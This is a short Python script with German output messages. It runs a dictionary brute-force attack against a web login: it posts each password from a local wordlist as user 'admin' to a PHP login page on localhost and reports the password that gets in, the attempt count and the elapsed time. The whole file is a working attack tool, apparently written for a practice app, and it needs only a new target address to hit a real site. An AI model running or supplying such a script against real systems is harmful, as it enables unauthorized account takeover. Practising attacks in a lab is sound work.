import requests, time, sys
TARGET  = "http://localhost/index.php"
USER    = "admin"
PWFILE  = "/home/ubuntu/bruteforce-app/passwords.txt"
def try_login(password):
    resp = requests.post(TARGET, data={"username": USER, "password": password}, timeout=5)
    return resp.status_code == 200 and "erfolgreich" in resp.text
with open(PWFILE) as f:
    passwords = [line.strip() for line in f if line.strip()]
print(f"Ziel:    {TARGET}\nUser:    {USER}\nWörter:  {len(passwords)}\n{'-'*40}")
start = time.time(); found = None
for i, pw in enumerate(passwords, 1):
    sys.stdout.write(f"\r[{i:>3}/{len(passwords)}] Teste: {pw:<20}"); sys.stdout.flush()
    if try_login(pw):
        found = pw; break
elapsed = time.time() - start
print(f"\n{'-'*40}")
print(f"✓ Passwort gefunden: '{found}'\n  Versuche: {i} | Zeit: {elapsed:.2f}s" if found else "✗ Kein Passwort gefunden.")
